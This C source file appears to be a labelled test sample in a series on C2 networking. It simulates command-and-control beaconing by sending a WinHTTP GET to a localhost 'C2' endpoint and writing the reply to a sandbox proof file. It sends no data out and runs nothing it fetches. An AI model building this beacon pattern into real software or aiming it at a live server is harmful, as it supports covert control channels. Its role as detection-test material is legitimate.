// SAMPLE: g6_03 | HTTPWinHTTP | Group: C2 Network & Exfiltration
// Technique: Synchronous HTTP Beaconing via WinHTTP
// Compile: x86_64-w64-mingw32-gcc -O2 -o g6_03_http_winhttp.exe g6_03_http_winhttp.c -lwinhttp
// PROOF WRITTEN FROM RAW SERVER RESPONSE — no client-side signature logic

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "winhttp.lib")

#define C2_HOST        L"127.0.0.1"
#define C2_PORT        8002
#define C2_PATH        L"/beacon"
#define PROOF_PATH     "C:\\C1_Sandbox\\c1_proof.txt"
#define RECV_BUF_SIZE  4096

int main(void) {
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    char      recvBuf[RECV_BUF_SIZE];
    DWORD     bytesRead = 0;
    int       ret       = EXIT_FAILURE;

    /* Open WinHTTP session */
    hSession = WinHttpOpen(
        L"C1WinHTTP/1.0",
        WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);
    if (!hSession) {
        fprintf(stderr, "[g6_03] WinHttpOpen failed: %lu\n", GetLastError());
        goto cleanup;
    }

    /* Connect to C2 server */
    hConnect = WinHttpConnect(
        hSession,
        C2_HOST,
        (INTERNET_PORT)C2_PORT,
        0);
    if (!hConnect) {
        fprintf(stderr, "[g6_03] WinHttpConnect failed: %lu\n", GetLastError());
        goto cleanup;
    }

    /* Open GET request (no TLS flags — plaintext HTTP) */
    hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        C2_PATH,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0);
    if (!hRequest) {
        fprintf(stderr, "[g6_03] WinHttpOpenRequest failed: %lu\n", GetLastError());
        goto cleanup;
    }

    /* Send request */
    if (!WinHttpSendRequest(
            hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA, 0,
            0, 0)) {
        fprintf(stderr, "[g6_03] WinHttpSendRequest failed: %lu\n", GetLastError());
        goto cleanup;
    }

    /* Wait for response */
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        fprintf(stderr, "[g6_03] WinHttpReceiveResponse failed: %lu\n", GetLastError());
        goto cleanup;
    }

    /* Read response body */
    if (!WinHttpReadData(hRequest, recvBuf, sizeof(recvBuf) - 1, &bytesRead)) {
        fprintf(stderr, "[g6_03] WinHttpReadData failed: %lu\n", GetLastError());
        goto cleanup;
    }

    if (bytesRead == 0) {
        fprintf(stderr, "[g6_03] Empty response from C2 server — no proof written\n");
        goto cleanup;
    }

    /* Write raw server response directly to proof file — no formatting logic */
    HANDLE hProof = CreateFileA(
        PROOF_PATH,
        GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (hProof == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[g6_03] CreateFileA proof failed: %lu\n", GetLastError());
        goto cleanup;
    }
    DWORD written = 0;
    WriteFile(hProof, recvBuf, (DWORD)bytesRead, &written, NULL);
    CloseHandle(hProof);

    printf("[g6_03] WinHTTP beacon sent; %lu bytes received; proof written to %s\n",
           bytesRead, PROOF_PATH);
    ret = EXIT_SUCCESS;

cleanup:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    return ret;
}
